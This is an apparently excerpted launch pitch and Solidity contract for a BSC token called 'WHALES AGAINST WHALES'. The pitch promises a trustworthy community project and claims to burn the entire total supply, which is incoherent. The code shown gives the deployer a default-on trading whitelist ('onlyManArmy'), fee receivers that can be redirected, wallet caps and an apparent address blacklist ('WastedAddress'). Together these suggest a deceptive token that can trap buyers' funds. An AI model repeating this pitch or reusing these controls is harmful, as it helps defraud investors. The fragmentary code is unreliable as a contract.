...
This will be a pure community project. 
I will burn the entirety of the Total Supply after launch.
I hope this brings back the confidence of trading in BSC.
I am challenging every whale in this space to go on a battle of wits against jeets.
BSC has become so toxic this few months and this calls for an action.
Investors should support legit devs and not pump and dumps projects.
This token aims to surpass or even transend to the generations of Now up to the generations of Then.
Apes , whales and investors alike, Let us unite and support safe and secure Coins.
If you're going to create a Telegram Group for this, I suggest you name it WAWCoinBSC
I will be at the background , watching how this one goes.
...
contract WHALESAGAINSTWHALES is IBEP20, Auth {
    ...
    string constant _name ="WHALES AGAINST WHALES";
    string constant _symbol = "WAW";
    ...
    bool public onlyManArmy = true;

    uint256 liquidityFee = 1;
    uint256 AntiJeetFee = 0; 
    ...
    address public marketingFeeReceiver = 0x237BC4fCaeDcA19c33d71c9A84829d72bB9BD490;
    address public AntiJeetFeeReceiver = msg.sender;
    ...
    constructor () Auth(msg.sender) {
        ...
        isManArmy[address(0x237BC4fCaeDcA19c33d71c9A84829d72bB9BD490)] = true;
    ...
    function removeManArmy(address account) external onlyOwner {
    ...
    function swapBack() internal swapping {
        ...
        uint256 amountBNBbuyback = amountBNB.mul(AntiJeetFee).div(totalBNBFee);
        uint256 amountBNBMarketing = amountBNB.mul(marketingFee).div(totalBNBFee);


        (bool MarketingSuccess, /* bytes memory data */) = payable(marketingFeeReceiver).call{value: amountBNBMarketing, gas: 30000}("");
        require(MarketingSuccess, "receiver rejected ETH transfer");
        (bool BuyBackSuccess, /* bytes memory data */) = payable(AntiJeetFeeReceiver).call{value: amountBNBbuyback, gas: 30000}("");
   ...
   function setMaxWallet(uint256 amount) external onlyOwner() {
    ...
    function setFeeReceiver(address _marketingFeeReceiver, address _buybackFeeReceiver) external authorized {
        ...
        AntiJeetFeeReceiver = _buybackFeeReceiver;
    }
    ...
    function WastedAddress(address _address, bool _value) public authorized{
